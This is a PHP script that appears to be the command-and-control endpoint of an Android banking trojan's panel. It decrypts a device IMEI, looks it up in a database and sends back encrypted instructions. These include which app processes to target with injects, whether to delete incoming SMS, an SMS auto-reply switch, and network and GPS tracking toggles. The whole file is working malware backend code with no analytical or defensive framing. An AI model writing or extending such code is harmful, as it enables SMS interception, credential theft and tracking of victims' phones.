<?php
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include 'crypt.php';
include 'config.php';
$request = decrypt($request,cryptKey);

$request = mb_substr($request,0,mb_strlen($request)-1);//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

$IMEI = $request;

$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');
$sql = "SELECT * FROM settings";

$booleanIMEI = false;
$inject = "";
$del_sms = "";
$check_true = "";

foreach($connection->query($sql) as $row)
{
	if($row['IMEI'] == $IMEI)
	{
		$inject = $row['inject'];
		$del_sms = $row['del_sms'];
		$check_true = $row['avtootvet_true'];
		$network = $row['avtootvet_sig1'];
		$gps = $row['avtootvet_sig2'];
		$booleanIMEI=true;	
		break;
	}
}

$sql = "SELECT * FROM injection";
$inject_s = explode("/", $inject);

$inj = "";
foreach($inject_s as $ids)
{
	
	foreach($connection->query($sql) as $row)
	{
		$procc = $row['process'];
		if($row['id'] == $ids)
		{
			$inj = "$inj/$procc";
		}
	}
}		

if($check_true == "1")
{$SMS = "true";}
else
{$SMS = "false";}

if($del_sms == "1")
{$del_sms = "true";}
else
{$del_sms = "false";}

if($network == "1")
{$network = "true";}
else
{$network = "false";}

if($gps == "1")
{$gps = "true";}
else
{$gps = "false";}


if($booleanIMEI == true)
{
	$tag = "<tag>";
	$otv = encrypt("$inj:$del_sms:$SMS:$network:$gps:",cryptKey);
	$tagend = "</tag>";

	echo "$tag$otv$tagend";
}
else
{
	$tag = "<tag>";
	$otv = encrypt("|NO|",cryptKey);
	$tagend = "</tag>";

	echo "$tag$otv$tagend";
}
?>